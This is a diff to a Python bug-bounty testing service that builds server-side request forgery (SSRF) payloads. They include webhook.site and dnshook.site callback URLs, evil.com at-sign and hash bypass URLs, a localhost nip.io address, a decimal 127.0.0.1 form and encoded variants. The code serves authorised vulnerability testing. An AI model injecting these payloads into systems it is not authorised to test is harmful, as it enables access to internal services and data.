@@ -11,6 +11,7 @@ Provides security testing utilities:
 
 from __future__ import annotations
 
+import base64
 import re
 import urllib.parse
 from datetime import datetime, timedelta, timezone
@@ -58,43 +59,51 @@ class BugBountyService:
         """
         id_param = f"?id={identifier}" if identifier else ""
         id_subdomain = f"{identifier}." if identifier else ""
-        
-        payloads = {
+
+        callback_payloads = {
             "http_url": f"http://webhook.site/{webhook_token}{id_param}",
             "https_url": f"https://webhook.site/{webhook_token}{id_param}",
             "subdomain_url": f"https://{webhook_token}.webhook.site{id_param}",
+            "at_bypass": f"https://evil.com@webhook.site/{webhook_token}",
+            "hash_bypass": f"https://webhook.site/{webhook_token}#@evil.com",
+            "redirect_chain": f"https://webhook.site/{webhook_token}?redirect=true",
         }
-        
+
         if include_dns:
-            payloads["dns_payload"] = f"{id_subdomain}{webhook_token}.dnshook.site"
-            payloads["dns_with_data"] = f"ssrf.{id_subdomain}{webhook_token}.dnshook.site"
-        
+            callback_payloads["dns_payload"] = f"{id_subdomain}{webhook_token}.dnshook.site"
+            callback_payloads["dns_with_data"] = f"ssrf.{id_subdomain}{webhook_token}.dnshook.site"
+
         if include_ip:
-            # Common SSRF bypass techniques using IP variations
-            payloads["localhost_bypass"] = f"http://127.0.0.1.nip.io/{webhook_token}{id_param}"
-            payloads["decimal_ip"] = f"http://2130706433/{webhook_token}{id_param}"  # 127.0.0.1 in decimal
-            payloads["url_encoded"] = urllib.parse.quote(f"https://webhook.site/{webhook_token}{id_param}")
-            payloads["double_encoded"] = urllib.parse.quote(urllib.parse.quote(f"https://webhook.site/{webhook_token}"))
-        
-        # Bypass patterns
-        payloads["at_bypass"] = f"https://evil.com@webhook.site/{webhook_token}"
-        payloads["hash_bypass"] = f"https://webhook.site/{webhook_token}#@evil.com"
-        payloads["redirect_chain"] = f"https://webhook.site/{webhook_token}?redirect=true"
-        
+            callback_payloads["url_encoded"] = urllib.parse.quote(
+                f"https://webhook.site/{webhook_token}{id_param}"
+            )
+            callback_payloads["double_encoded"] = urllib.parse.quote(
+                urllib.parse.quote(f"https://webhook.site/{webhook_token}")
+            )
+
+        local_bypass_examples: dict[str, str] = {}
+        if include_ip:
+            local_bypass_examples = {
+                "localhost_bypass": f"http://127.0.0.1.nip.io/{webhook_token}{id_param}",
+                "decimal_ip": f"http://2130706433/{webhook_token}{id_param}",
+            }
+
+        total = len(callback_payloads) + len(local_bypass_examples)
         return ToolResult(
             success=True,
-            message=f"Generated {len(payloads)} SSRF payloads",
+            message=f"Generated {total} SSRF payloads",
             data={
                 "token": webhook_token,
                 "identifier": identifier,
-                "payloads": payloads,
+                "callback_payloads": callback_payloads,
+                "local_bypass_examples": local_bypass_examples,
                 "usage_tips": [
-                    "Inject these URLs in parameters, headers, file imports, etc.",
-                    "DNS payloads can detect SSRF even when HTTP response is blocked",
-                    "Use check_for_callbacks to see if any payload triggered",
-                    "The identifier helps track which injection point worked",
-                ]
-            }
+                    "callback_payloads hit webhook.site or dnshook.site and can be confirmed with check_for_callbacks.",
+                    "local_bypass_examples target localhost and will not appear as webhook.site callbacks.",
+                    "DNS payloads can detect SSRF even when the HTTP response is blocked.",
+                    "The identifier helps track which injection point worked.",
+                ],
+            },
         )
     
     async def check_for_callbacks(
@@ -328,7 +337,6 @@ class BugBountyService:
             return ToolResult(
                 success=False,
                 message="No requests found",
-                data=None
             )
         
         request = requests[0]
@@ -381,7 +389,6 @@ class BugBountyService:
     @staticmethod
     def _base64_encode(text: str) -> str:
         """Base64 encode a string."""
-        import base64
         return base64.b64encode(text.encode()).decode()
     
     @staticmethod
